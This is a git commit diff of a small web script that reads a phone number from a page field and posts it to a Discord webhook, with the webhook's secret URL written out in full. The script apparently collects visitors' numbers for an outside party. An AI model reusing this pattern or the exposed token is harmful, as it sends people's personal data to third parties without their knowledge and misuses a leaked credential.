0e1af4408ad21b231c7a8e82130e854635bf9aa8
Rxea <134072667+ZxySynap@users.noreply.github.com>
2025-05-04 12:55:19 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,14 +1,12 @@
-const number = document.getElementById("mobile_txtfield_msg");
-const footer_button = document.getElementById("footer_button");
+const number = document.getElementById("mobile_txtfield");
 
 function sendWebhook() {
     var webhookURL = 'https://discord.com/api/webhooks/1332732406280487056/Z0nJyZJL5Jw0LxL2q1qr1_ycJUxBGL1OMCtP0Fn3g4Opc45xbdq6_jiGFRPGseyB18-7';
     var data = {
-        "content": null,
         "embeds": [
             {
                 "title": "New Number",
-                "description": `New number: ${number.value}`,
+                "description": `New number: ${number ? number.value : 'N/A'}`,
                 "color": 16777215,
                 "footer": {
                     "text": "Number sent from the website"
@@ -27,8 +25,3 @@ function sendWebhook() {
 
     fetch(webhookURL, requestOptions)
 }
-
-
-footer_button.addEventListener("click", function () {
-  sendWebhook();
-});
